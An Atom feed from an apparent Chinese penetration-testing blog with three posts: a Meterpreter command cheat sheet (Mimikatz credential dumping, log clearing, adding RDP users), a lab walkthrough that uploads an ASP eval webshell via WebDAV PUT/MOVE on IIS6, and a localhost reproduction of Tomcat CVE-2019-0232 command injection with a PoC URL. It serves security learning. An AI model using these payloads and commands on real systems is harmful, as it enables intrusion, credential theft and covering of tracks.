<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pr0ud</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://msxl.github.io/"/>
  <updated>2019-10-12T07:50:37.217Z</updated>
  <id>http://msxl.github.io/</id>
  
  <author>
    <name>Pr0ud</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试之meterpreter简单使用</title>
    <link href="http://msxl.github.io/2019/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8Bmeterpreter%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://msxl.github.io/2019/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8Bmeterpreter%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
    <published>2019-10-12T07:47:46.000Z</published>
    <updated>2019-10-12T07:50:37.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试之meterpreter简单使用"><a href="#渗透测试之meterpreter简单使用" class="headerlink" title="渗透测试之meterpreter简单使用"></a>渗透测试之meterpreter简单使用</h1><h2 id="0x01、系统命令"><a href="#0x01、系统命令" class="headerlink" title="0x01、系统命令"></a>0x01、系统命令</h2><h5 id="1、基本系统命令"><a href="#1、基本系统命令" class="headerlink" title="1、基本系统命令"></a>1、基本系统命令</h5><pre><code>sessions                    #sessions -h 查看帮助sessions -i &lt;ID值&gt;             #进入会话   -k 杀死会话backgroud                    #将当前会话放置后台run                            #执行模块输入run tab键按两次列出已有脚本info                        #查看已有模块信息getuid                        #查看权限getpid                        #获取当前进程的pidsysinfo                        #查看目标机系统信息ps                            #查看当前活跃进程    kill&lt;PID值&gt; 杀死进程idletime                    #查看目标机闲置时间reboot/shutdown                #重启/关机shell                        #进入目标机cmdclearav                        #清除windows中的应用程序日志load/use                    #加载模块</code></pre><a id="more"></a><h5 id="2、文件命令"><a href="#2、文件命令" class="headerlink" title="2、文件命令"></a>2、文件命令</h5><pre><code>download        #下载文件   download c:\\flag.txtupload             #上传文件    uplaod flag.txt c:\\flag\\cat                #查看文件内容    cat flag.txtdel                #删除指定文件    del c:\\flag.txt</code></pre><h5 id="3-抓取密码"><a href="#3-抓取密码" class="headerlink" title="3.抓取密码"></a>3.抓取密码</h5><pre><code>load mimikatz        #加载mimikatz模块kerberos            #获取明文密码tspkg                #获取明文密码wdigest                #获取密码 跟kerberos相同hashdump            #获取哈希值mimikatz_command -f samdump::hashes        #获取哈希值mimikatz_command -f sekurlsa::searchPasswprds        #获取明文密码</code></pre><h5 id="4-getgui命令-amp-enable-rdp"><a href="#4-getgui命令-amp-enable-rdp" class="headerlink" title="4.getgui命令&amp;enable_rdp"></a>4.getgui命令&amp;enable_rdp</h5><pre><code>run getgui -h    #查看帮助run getgui -e    #开启远程桌面run getgui -u admin -p admin    #添加用户run getgui -f 1314 -e    #3389端口转发为1314run post/windows/manage/enable_rdp    #开启远程桌面run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin #添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=1314  #将3389端口转发到1314</code></pre><h5 id="5、网络命令"><a href="#5、网络命令" class="headerlink" title="5、网络命令"></a>5、网络命令</h5><pre><code>ipconfig/ifconfig        #查看IPnetstat                    #查看端口route                    #查看路由getproxy                #查看代理信息</code></pre><h5 id="6、远程桌面"><a href="#6、远程桌面" class="headerlink" title="6、远程桌面"></a>6、远程桌面</h5><pre><code>enumdesktops    #查看可用的桌面getdesktop        #获取当前meterpreter 关联的桌面set_desktop        #设置meterpreter关联的桌面  -h查看帮助screenshot        #截屏use espia        #或者使用espia模块截屏  然后输入screengrabrun vnc            #使用vnc远程桌面连接rdesktop        #远程桌面    rdesktop +ip需要在终端输入</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;渗透测试之meterpreter简单使用&quot;&gt;&lt;a href=&quot;#渗透测试之meterpreter简单使用&quot; class=&quot;headerlink&quot; title=&quot;渗透测试之meterpreter简单使用&quot;&gt;&lt;/a&gt;渗透测试之meterpreter简单使用&lt;/h1&gt;&lt;h2 id=&quot;0x01、系统命令&quot;&gt;&lt;a href=&quot;#0x01、系统命令&quot; class=&quot;headerlink&quot; title=&quot;0x01、系统命令&quot;&gt;&lt;/a&gt;0x01、系统命令&lt;/h2&gt;&lt;h5 id=&quot;1、基本系统命令&quot;&gt;&lt;a href=&quot;#1、基本系统命令&quot; class=&quot;headerlink&quot; title=&quot;1、基本系统命令&quot;&gt;&lt;/a&gt;1、基本系统命令&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;sessions                    #sessions -h 查看帮助
sessions -i &amp;lt;ID值&amp;gt;             #进入会话   -k 杀死会话
backgroud                    #将当前会话放置后台
run                            #执行模块输入run tab键按两次列出已有脚本
info                        #查看已有模块信息
getuid                        #查看权限
getpid                        #获取当前进程的pid
sysinfo                        #查看目标机系统信息
ps                            #查看当前活跃进程    kill&amp;lt;PID值&amp;gt; 杀死进程
idletime                    #查看目标机闲置时间
reboot/shutdown                #重启/关机
shell                        #进入目标机cmd
clearav                        #清除windows中的应用程序日志
load/use                    #加载模块&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://msxl.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Metasploit" scheme="http://msxl.github.io/tags/Metasploit/"/>
    
      <category term="kali" scheme="http://msxl.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>IIS写权限漏洞</title>
    <link href="http://msxl.github.io/2019/09/24/IIS%E5%86%99%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://msxl.github.io/2019/09/24/IIS%E5%86%99%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-09-24T01:13:14.000Z</published>
    <updated>2019-09-24T01:35:52.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><h4 id="1、了解IIS-WebDAV安全配置；"><a href="#1、了解IIS-WebDAV安全配置；" class="headerlink" title="1、了解IIS WebDAV安全配置；"></a>1、了解IIS WebDAV安全配置；</h4><h4 id="2、了解HTTP标准方法外的其他一些方法；"><a href="#2、了解HTTP标准方法外的其他一些方法；" class="headerlink" title="2、了解HTTP标准方法外的其他一些方法；"></a>2、了解HTTP标准方法外的其他一些方法；</h4><h4 id="3、掌握HTTP-PUT的方法测试利用；"><a href="#3、掌握HTTP-PUT的方法测试利用；" class="headerlink" title="3、掌握HTTP PUT的方法测试利用；"></a>3、掌握HTTP PUT的方法测试利用；</h4><h4 id="4、了解IIS6的畸形解析漏洞及利用测试方法；"><a href="#4、了解IIS6的畸形解析漏洞及利用测试方法；" class="headerlink" title="4、了解IIS6的畸形解析漏洞及利用测试方法；"></a>4、了解IIS6的畸形解析漏洞及利用测试方法；</h4><h1 id="实训操作"><a href="#实训操作" class="headerlink" title="实训操作"></a>实训操作</h1><h4 id="1、打开网站发现什么都没有，真的是干净的一批呀！"><a href="#1、打开网站发现什么都没有，真的是干净的一批呀！" class="headerlink" title="1、打开网站发现什么都没有，真的是干净的一批呀！"></a>1、打开网站发现什么都没有，真的是干净的一批呀！</h4><img src="/2019/09/24/IIS写权限漏洞/Image1.png" title="avatar"><h4 id="2、打开burp进行抓包，查看包："><a href="#2、打开burp进行抓包，查看包：" class="headerlink" title="2、打开burp进行抓包，查看包："></a>2、打开burp进行抓包，查看包：</h4><img src="/2019/09/24/IIS写权限漏洞/Image2.png" title="avatar"><h4 id="3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限："><a href="#3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限：" class="headerlink" title="3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限："></a>3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：</h4><a id="more"></a><img src="/2019/09/24/IIS写权限漏洞/Image3.png" title="avatar"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开头将GET改为OPTIONS</span><br><span class="line"></span><br><span class="line">OPTIONS/ HTTP/1.1</span><br></pre></td></tr></table></figure><h4 id="4、-查看其中有-PUT-和-MOVE-等操作权限，那下一步就可以上传一句话木马了："><a href="#4、-查看其中有-PUT-和-MOVE-等操作权限，那下一步就可以上传一句话木马了：" class="headerlink" title="4、 查看其中有 PUT 和 MOVE 等操作权限，那下一步就可以上传一句话木马了："></a>4、 查看其中有 PUT 和 MOVE 等操作权限，那下一步就可以上传一句话木马了：</h4><img src="/2019/09/24/IIS写权限漏洞/Image4.png" title="avatar"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">只保留用这四行就可以了，不然的话你上传木马会出现404</span><br><span class="line"></span><br><span class="line">OPTIONS替换为PUT</span><br><span class="line">PUT /1.txt HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:47517</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;0x3mSxl&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>5、利用iis6文件解析漏洞，用MOVE改文件后缀名为.asp;.jpg：</p><img src="/2019/09/24/IIS写权限漏洞/Image5.png" title="avatar"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开头PUT改为MOVE，添加Destination: /1.asp;.jpg</span><br><span class="line"></span><br><span class="line">MOVE /1.txt HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:47517</span><br><span class="line">Destination: /1.asp;.jpg</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;0x3mSxl&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>6、蚁剑连接：</p><img src="/2019/09/24/IIS写权限漏洞/Image6.png" title="avatar"><p>访问网站：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47517/1.asp;.jpg</span><br><span class="line">以上是连接成功的图片</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实训目标&quot;&gt;&lt;a href=&quot;#实训目标&quot; class=&quot;headerlink&quot; title=&quot;实训目标&quot;&gt;&lt;/a&gt;实训目标&lt;/h1&gt;&lt;h4 id=&quot;1、了解IIS-WebDAV安全配置；&quot;&gt;&lt;a href=&quot;#1、了解IIS-WebDAV安全配置；&quot; class=&quot;headerlink&quot; title=&quot;1、了解IIS WebDAV安全配置；&quot;&gt;&lt;/a&gt;1、了解IIS WebDAV安全配置；&lt;/h4&gt;&lt;h4 id=&quot;2、了解HTTP标准方法外的其他一些方法；&quot;&gt;&lt;a href=&quot;#2、了解HTTP标准方法外的其他一些方法；&quot; class=&quot;headerlink&quot; title=&quot;2、了解HTTP标准方法外的其他一些方法；&quot;&gt;&lt;/a&gt;2、了解HTTP标准方法外的其他一些方法；&lt;/h4&gt;&lt;h4 id=&quot;3、掌握HTTP-PUT的方法测试利用；&quot;&gt;&lt;a href=&quot;#3、掌握HTTP-PUT的方法测试利用；&quot; class=&quot;headerlink&quot; title=&quot;3、掌握HTTP PUT的方法测试利用；&quot;&gt;&lt;/a&gt;3、掌握HTTP PUT的方法测试利用；&lt;/h4&gt;&lt;h4 id=&quot;4、了解IIS6的畸形解析漏洞及利用测试方法；&quot;&gt;&lt;a href=&quot;#4、了解IIS6的畸形解析漏洞及利用测试方法；&quot; class=&quot;headerlink&quot; title=&quot;4、了解IIS6的畸形解析漏洞及利用测试方法；&quot;&gt;&lt;/a&gt;4、了解IIS6的畸形解析漏洞及利用测试方法；&lt;/h4&gt;&lt;h1 id=&quot;实训操作&quot;&gt;&lt;a href=&quot;#实训操作&quot; class=&quot;headerlink&quot; title=&quot;实训操作&quot;&gt;&lt;/a&gt;实训操作&lt;/h1&gt;&lt;h4 id=&quot;1、打开网站发现什么都没有，真的是干净的一批呀！&quot;&gt;&lt;a href=&quot;#1、打开网站发现什么都没有，真的是干净的一批呀！&quot; class=&quot;headerlink&quot; title=&quot;1、打开网站发现什么都没有，真的是干净的一批呀！&quot;&gt;&lt;/a&gt;1、打开网站发现什么都没有，真的是干净的一批呀！&lt;/h4&gt;&lt;img src=&quot;/2019/09/24/IIS写权限漏洞/Image1.png&quot; title=&quot;avatar&quot;&gt;&lt;h4 id=&quot;2、打开burp进行抓包，查看包：&quot;&gt;&lt;a href=&quot;#2、打开burp进行抓包，查看包：&quot; class=&quot;headerlink&quot; title=&quot;2、打开burp进行抓包，查看包：&quot;&gt;&lt;/a&gt;2、打开burp进行抓包，查看包：&lt;/h4&gt;&lt;img src=&quot;/2019/09/24/IIS写权限漏洞/Image2.png&quot; title=&quot;avatar&quot;&gt;&lt;h4 id=&quot;3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限：&quot;&gt;&lt;a href=&quot;#3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限：&quot; class=&quot;headerlink&quot; title=&quot;3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：&quot;&gt;&lt;/a&gt;3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：&lt;/h4&gt;
    
    </summary>
    
    
      <category term="漏洞利用" scheme="http://msxl.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="Web" scheme="http://msxl.github.io/tags/Web/"/>
    
      <category term="漏洞利用" scheme="http://msxl.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0232漏洞复现</title>
    <link href="http://msxl.github.io/2019/09/11/CVE-2019-0232%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://msxl.github.io/2019/09/11/CVE-2019-0232%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-09-10T22:33:01.000Z</published>
    <updated>2020-04-24T15:21:13.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-0232漏洞复现"><a href="#CVE-2019-0232漏洞复现" class="headerlink" title="CVE-2019-0232漏洞复现"></a>CVE-2019-0232漏洞复现</h1><h4 id="1、漏洞背景："><a href="#1、漏洞背景：" class="headerlink" title="1、漏洞背景："></a>1、漏洞背景：</h4><p>​    <strong>Apache Tomcat是在Apache Software Foundation (ASF)支持下开发的开源Java  Servlet容器，实现了多个Java EE规范，包括Java Servlet, JavaServer Pages (JSP), Java  Expression Language (EL), WebSocket，提供一个Java代码运行的纯Java HTTP web服务器环境。</strong></p><a id="more"></a><p>​    <strong>4月10日，Apache Tomcat披露了一个漏洞，漏洞编号：CVE-2019-0232，该漏洞是Apache Tomcat的Common Gateway  Interface (CGI) Servlet的远程代码执行漏洞。攻击者利用该高危漏洞可以滥用Tomcat CGI  Servlet输入有效性错误导致的操作系统命令注入来执行任意命令。</strong></p><h4 id="2、影响范围："><a href="#2、影响范围：" class="headerlink" title="2、影响范围："></a>2、影响范围：</h4><p>​    <strong>Apache Tomcat 9.0.0.M1 to 9.0.17</strong></p><p>​    <strong>Apache Tomcat 8.5.0 to 8.5.39</strong></p><p>​    <strong>Apache Tomcat 7.0.0 to 7.0.93</strong></p><h4 id="3、漏洞复现："><a href="#3、漏洞复现：" class="headerlink" title="3、漏洞复现："></a>3、漏洞复现：</h4><h5 id="1-测试环境："><a href="#1-测试环境：" class="headerlink" title="1.测试环境："></a>1.测试环境：</h5><p>​    <a href="下载地址：（https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/）">Tomcat 8.5.39</a></p><p>​     <a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">JDK 8ul21</a></p><h5 id="2-配置环境："><a href="#2-配置环境：" class="headerlink" title="2.配置环境："></a>2.配置环境：</h5><p>打开：控制面板–&gt;系统和安全–&gt;系统–&gt;高级系统设置–&gt;高级–&gt;环境变量</p><p>在系统变量中添加一个变量CATALINA_HOME，变量值为tomcat目录</p><img src="/2019/09/11/CVE-2019-0232漏洞复现/t1.png" title="avatar"><p>继续编辑系统变量中的path，添加两个值，jre1.8.0_211 | jdk1.8.0_211，在java目录下</p><img src="/2019/09/11/CVE-2019-0232漏洞复现/t2.png" title="avatar"><ul><li><h6 id="配置成功后进入cmd-exe"><a href="#配置成功后进入cmd-exe" class="headerlink" title="配置成功后进入cmd.exe"></a>配置成功后进入cmd.exe</h6></li></ul><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#命令：java -version</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\20872&gt;<span class="title">java</span> -<span class="title">version</span></span></span><br><span class="line"><span class="function"><span class="title">java</span> <span class="title">version</span> "1.8.0<span class="title">_211</span>"</span></span><br><span class="line"><span class="function"><span class="title">Java</span>(<span class="title">TM</span>) <span class="title">SE</span> <span class="title">Runtime</span> <span class="title">Environment</span> (<span class="title">build</span> 1.8.0<span class="title">_211</span>-<span class="title">b12</span>)</span></span><br><span class="line"><span class="function"><span class="title">Java</span> <span class="title">HotSpot</span>(<span class="title">TM</span>) 64-<span class="title">Bit</span> <span class="title">Server</span> <span class="title">VM</span> (<span class="title">build</span> 25.211-<span class="title">b12</span>, <span class="title">mixed</span> <span class="title">mode</span>)</span></span><br><span class="line"><span class="function">#提示以上说明成功</span></span><br></pre></td></tr></table></figure><ul><li><h6 id="打开apache-tomcat-8-5-39-conf-web-xml进行编辑"><a href="#打开apache-tomcat-8-5-39-conf-web-xml进行编辑" class="headerlink" title="打开apache-tomcat-8.5.39\conf\web.xml进行编辑"></a>打开apache-tomcat-8.5.39\conf\web.xml进行编辑</h6></li></ul><p><strong>把第375–384进行修改</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cgi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.CGIServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>cgiPathPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>WEB-INF/cgi-bin<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>executable<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>5<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">#建议删除375--384行，把上文ctrl+c到375行，防止出错</span><br></pre></td></tr></table></figure><p><strong>第427–432进行编辑</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">#建议删除427-432行，把上文ctrl+c到428行，防止出错</span><br></pre></td></tr></table></figure><ul><li><h6 id="更改apache-tomcat-8-5-39-conf-context-xml"><a href="#更改apache-tomcat-8-5-39-conf-context-xml" class="headerlink" title="更改apache-tomcat-8.5.39\conf\context.xml"></a>更改apache-tomcat-8.5.39\conf\context.xml</h6></li></ul><p><strong>更改第19行</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span> 改为 <span class="tag">&lt;<span class="name">Context</span> <span class="attr">privileged</span>=<span class="string">"true"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>记住要保存哦！d=====(￣▽￣*)b</p><ul><li><h6 id="在apache-tomcat-8-5-39-webapps-ROOT-WEB-INF目录新建一个cgi-bin文件夹，创建一个bat-bat的文件，内容如下："><a href="#在apache-tomcat-8-5-39-webapps-ROOT-WEB-INF目录新建一个cgi-bin文件夹，创建一个bat-bat的文件，内容如下：" class="headerlink" title="在apache-tomcat-8.5.39\webapps\ROOT\WEB-INF目录新建一个cgi-bin文件夹，创建一个bat.bat的文件，内容如下："></a>在apache-tomcat-8.5.39\webapps\ROOT\WEB-INF目录新建一个cgi-bin文件夹，创建一个bat.bat的文件，内容如下：</h6><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Content-<span class="built_in">Type</span>: text/plain</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> foo=%~<span class="number">1</span></span><br><span class="line"><span class="variable">%foo%</span></span><br></pre></td></tr></table></figure></li><li><h6 id="搭建环境结束"><a href="#搭建环境结束" class="headerlink" title="搭建环境结束"></a>搭建环境结束</h6></li></ul><h5 id="3-漏洞利用："><a href="#3-漏洞利用：" class="headerlink" title="3.漏洞利用："></a>3.漏洞利用：</h5><p>打开网站127.0.0.1：8080 或 localhost:8080,使用poc进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/cgi-bin/bat.bat?&amp;C%3a%5cwindows%5csystem32%5cipconfig</span><br></pre></td></tr></table></figure><img src="/2019/09/11/CVE-2019-0232漏洞复现/t3.png" title="avatar"><h4 id="4、漏洞利用原理："><a href="#4、漏洞利用原理：" class="headerlink" title="4、漏洞利用原理："></a>4、漏洞利用原理：</h4><p>漏洞相关的代码在 <code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code> 中，CGIServlet提供了一个cgi的调用接口，在启用 <code>enableCmdLineArguments</code> 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 <code>Runtime</code> 执行。 这个漏洞是因为 <code>Runtime.getRuntime().exec</code> 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rem arg.bat</span><br><span class="line">echo %*</span><br></pre></td></tr></table></figure><p>并执行如下的Java代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String [] cmd=&#123;&quot;arg.bat&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><p>在Windows下会输出 <code>arg</code> 和 <code>dir</code> 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># arg.sh</span><br><span class="line">for key in &quot;$@&quot;</span><br><span class="line">do</span><br><span class="line">    echo &apos;$@&apos; $key</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String [] cmd=&#123;&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><p>此时的输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$@ arg</span><br><span class="line">$@ &amp;</span><br><span class="line">$@ dir</span><br></pre></td></tr></table></figure><p>导致这种输出的原因是在JDK的实现中 <code>Runtime.getRuntime().exec</code> 实际调用了 <code>ProcessBuilder</code> ，而后 <code>ProcessBuilder</code> 调用 <code>ProcessImpl</code>使用系统调用 <code>vfork</code> ，把所有参数直接传递至 <code>execve</code>。</p><p>用 <code>strace -F -e vfork,execve java Main</code> 跟踪可以看到上面的Java代码在Linux中调用为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;arg.sh&quot;, [&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */])</span><br></pre></td></tr></table></figure><p>而如果跟踪类似的PHP代码 <code>system(&#39;a.sh arg &amp; dir&#39;);</code> ，得到的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,  [&quot;sh&quot;, &quot;-c&quot;, &quot;a.sh arg &amp; dir&quot;], [/* 23 vars */])</span><br></pre></td></tr></table></figure><p>所以Java的 <code>Runtime.getRuntime().exec</code> 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是 <code>CreateProcess</code> ，会将参数合并成字符串，作为 <code>lpComandLine</code> 传入 <code>CreateProcess</code> 。程序启动后调用 <code>GetCommandLine</code> 获取参数，并调用 <code>CommandLineToArgvW</code> 传至 argv。在Windows中，当 <code>CreateProcess</code> 中的参数为 bat 文件或是 cmd 文件时，会调用 <code>cmd.exe</code> , 故最后会变成 <code>cmd.exe /c &quot;arg.bat &amp; dir&quot;</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p><p>除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 <code>dir &quot;\&quot;&amp;whoami&quot;</code> 在Linux中是安全的，而在Windows会执行命令。</p><p>这是因为Windows在处理命令行参数时，会将 <code>&quot;</code> 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 <code>&quot;</code> ，但是对 <code>\&quot;</code> 的处理有误。同样用 <code>arg.bat</code> 做测试，可以发现这里只输出了 <code>\</code> 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。</p><h4 id="5、复现总结："><a href="#5、复现总结：" class="headerlink" title="5、复现总结："></a>5、复现总结：</h4><p>今天复现这个漏洞遇到了一个很大的坑，就是当你改了web.xml后如果有一个地方敲错了，你就无法访问了，刚刚开始我以为是在运行的时候乱码的原因，然后百度了一会是将bin\catlina.bat 文件的第111行添加set JAVA_OPTS=-Xms512m -Xmx1024m -XX:MaxPermSize=1024m -Dfile.encoding=UTF-8 ，然后开启它，发现乱码修复了但是还是404 ，然后我又重新下载了无数次，在改web.xml的时候，发现我笔记里多了一个<init-param>然后心态直接就崩溃了，由于以上问题耽误了很长的时间，所有今天只测试了      8 .5.39跟9.0.17 ，有兴趣的可以自行搭建测试，祝大家复现一路顺风~</init-param></p><p>参考文章：<a href="https://xz.aliyun.com/t/4875" target="_blank" rel="noopener">https://xz.aliyun.com/t/4875</a></p>]]></content>
    
    <summary type="html">
    
